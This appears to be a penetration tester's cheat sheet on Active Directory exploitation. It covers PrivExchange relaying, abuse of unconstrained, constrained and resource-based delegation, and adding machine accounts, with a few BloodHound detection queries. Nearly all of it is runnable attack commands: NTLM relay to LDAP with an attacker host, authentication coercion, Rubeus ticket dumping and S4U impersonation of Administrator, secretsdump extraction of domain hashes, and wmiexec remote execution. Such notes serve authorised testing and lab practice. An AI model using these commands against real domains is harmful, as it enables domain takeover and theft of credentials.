# Exploitation

## PrivExchange (CVE-2019-0724 & CVE-2019-0686)

> The user need a mailbox associated

```bash
python3 ntlmrelayx.py -t ldap://dc.domain.com --escalate-user user
python3 privexchange.py -ah attackerHost.domain.com s2012exc.testsegment.local -u user -d domain.com
python3 secretsdump.py domain.com/user@dc.domain.com -just-dc
```

## Delegations

With Unconstrained Delegation, the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host.

There is three type of delegation in active directory:

1. Unconstrained delegation
2. Constrained delegation
3. Resource based delegation


### Unconstrained delegation

#### Detect

![Alt text](/Images/image-9.png)

```
MATCH (c {unconstraineddelegation:true}) return c
# If you want to search for unconstrained delegation system (out of domain controller) :
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2
```

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

#### Explotation

Attacker

```bash
python3 Coercer.py coerce -u username -d domain.com -p Pass -t targetDC -l PCwithshell
```

```powershell
.\Rubeus.exe triage
.\Rubeus.exe dump /user:targetDC$ /service:krbtgt /nowrap
#copy base64 ticket
```

```bash
#if necessary echo 'ticketcontent' | tr -d "\n" | tr -d " " | base64 -d > ticket.kirbi
python3 ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py -k -no-pass domain.com/'targetDC$'@ipordnsname
```

### Constrained Delegation

#### Detect

```bash
MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p
python3 findDelegation.py domain.com/username:pass -target-domain domain.com
```
![Alt text](/Images/image-10.png)

#### Exploitation

To abuse the constrained delegation with protocol transition, the concept is to first ask a TGT for the user and execute S4U2Self followed by a S4U2Proxy to impersonate an admin user to the SPN on the target.

##### With protocol transition

```powershell
# ticket.kirbi is saved on C:\Windows\System32
.\Rubeus.exe asktgt /user:username /domain:domain.com /password:password /outfile:ticket.kirbi
asktgt /user:username /domain:domain.com /rc4:B8D76E56E9DAC90539AFF05E3CCB1755
.\Rubeus.exe s4u /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:CIFS/pcdomain /ptt /outfile:ticket2.kirbi   #DelegationRightsTo contain pcdomain CIFS/pc or HTTP/pc
```

```bash
getST.py -spn 'CIFS/pc' -impersonate Administrator -dc-ip 'DCIP' 'domain.com/username:password'
## Attack after obtaining the ticket
python3 secretsdump.py -k -no-pass domain.com/Administrator@iptarget
python3 wmiexec.py -k -no-pass domain.com/Administrator@iptarget
```

##### Without protocol transition

> The self-RBCD trick doesnâ€™t work anymore

READ THIS. NOTHING MORE

- https://mayfly277.github.io/posts/GOADv2-pwning-part10/#without-protocol-transition

### Resource Based Constrained Delegation

You can abuse RBCD when you can edit the attribute : msDS-AllowedToActOnBehalfOfOtherIdentity

![Alt text](/Images/image-11.png)

```bash
# reate computer
python3 addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host dc.domain.com 'domain.com/username:password'
# add delegation write on our target from rbcd$
python3 rbcd.py -delegate-from 'rbcd$' -delegate-to 'namePCDC$' -dc-ip 'dc.domain.com' -action 'write' domain.com/username:password
python3 getST.py 'cifs/dc.domain.com' -impersonate Administrator -dc-ip 'dc.domain.com' 'domain.com/rbcd$:rbcdpass'
export KRB5CCNAME=/path/to/file.ccache
python3 secretsdump.py -k -no-pass domain.com/Administrator@iptarget
python3 wmiexec.py -k -no-pass domain.com/Administrator@iptarget
# Clean up
python3 rbcd.py -delegate-from 'rbcd$' -delegate-to 'namePCDC$' -dc-ip 'dc.domain.com' -action 'flush' domain.com/username:password
python3 addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host dc.domain.com 'domain.com/domainAdminUser:passofDomainAdmin' -delete
```

## Add computer and RBCD



```bash
crackmapexec ldap ip -u username -p password -d domain.com -M MAQ
python3 addcomputer.py -computer-name 'pcname$' -computer-pass 'ComputerPassword' -dc-host dc.domain.com -domain-netbios NETBIOS-NAME 'domain.com/user:pass'

# Obtain SID

$o = ([ADSI]"LDAP://CN=krbrelay,CN=Computers,DC=domain,DC=com").objectSID
(New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
```